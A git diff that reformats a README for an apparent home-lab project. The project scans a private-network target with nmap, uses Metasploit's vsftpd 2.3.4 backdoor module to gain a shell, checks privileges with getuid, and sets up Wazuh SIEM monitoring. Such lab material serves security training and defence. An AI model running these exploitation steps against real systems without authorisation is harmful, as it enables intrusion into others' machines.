@@ -20,45 +20,49 @@ This project demonstrates vulnerability scanning, exploitation, and SIEM monitor
   ```bash
   ip addr
   
-Step 2: Port Scanning
+##Step 2: Port Scanning
 
 -Scan target machine using:
-
--nmap 192.168.56.101
-
+```bash
+nmap 192.168.56.101
+```
 -Identify open ports and services.
 
-Step 3: Vulnerability Identification
+##Step 3: Vulnerability Identification
 
 -Search for vulnerabilities using Metasploit:
+```bash
+search vsftpd
+```
 
--search vsftpd
-
-Step 4: Exploitation
+##Step 4: Exploitation
 
 -Configure exploit module:
-
+```bash
 -use exploit/unix/ftp/vsftpd_234_backdoor
+```
 
 -Execute exploit:
+```bash
+exploit
+```
 
--exploit
-
-Step 5: Privilege Verification
+##Step 5: Privilege Verification
 
 -Verify access level:
+```bash
+getuid
+```
 
--getuid
-
-Step 6: Wazuh SIEM Setup
+##Step 6: Wazuh SIEM Setup
 
 -Verify Docker installation:
-
--docker --version
-
+```bash
+docker --version
+```
 -Start Wazuh dashboard and agent.
 
-Step 7: Monitoring and Logging
+##Step 7: Monitoring and Logging
 
 -View connected agents
 
